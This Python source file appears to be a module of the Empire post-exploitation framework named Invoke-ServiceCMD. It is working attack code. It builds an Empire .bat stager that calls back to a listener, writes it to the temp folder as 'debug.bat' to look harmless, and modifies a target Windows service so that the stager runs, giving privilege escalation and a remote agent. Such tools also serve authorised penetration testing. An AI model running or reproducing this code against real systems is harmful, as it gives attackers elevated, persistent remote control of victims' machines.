from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-ServiceCMD',

            'Author': ['@harmj0y'],

            'Description': ("Modifies a target service to execute an Empire stager."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'MinPSVersion' : '2',
            
            'Comments': [
                'https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ServiceName' : {
                'Description'   :   "The service name to manipulate.",
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }     
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        moduleName = self.info["Name"]
        
        # read in the common powerup.ps1 module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/PowerUp.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        # get just the code needed for the specified function
        script = helpers.generate_dynamic_powershell_script(moduleCode, moduleName)

        # extract all of our options
        serviceName = self.options['ServiceName']['Value']
        listenerName = self.options['Listener']['Value']

        if not self.mainMenu.listeners.is_listener_empire(listenerName):
            print helpers.color("[!] Empire listener required!")
            return ""
        
        # generate the .bat launcher code to write out to the specified location
        l = self.mainMenu.stagers.stagers['launcher_bat']
        l.options['Listener']['Value'] = self.options['Listener']['Value']
        l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
        l.options['Proxy']['Value'] = self.options['Proxy']['Value']
        l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
        l.options['Delete']['Value'] = "True"
        launcherCode = l.generate()

        # PowerShell code to write the launcher.bat out
        script += "$tempLoc = \"$env:temp\debug.bat\""
        script += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
        script += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
        script += "\"Launcher bat written to $tempLoc `n\";\n"
  
        if launcherCode == "":
            print helpers.color("[!] Error in launcher .bat generation.")
            return ""

        script += "Invoke-ServiceCMD -ServiceName \""+serviceName+"\" -CMD \"C:\Windows\System32\cmd.exe /C `\"$env:Temp\debug.bat`\"\""
            
        return script
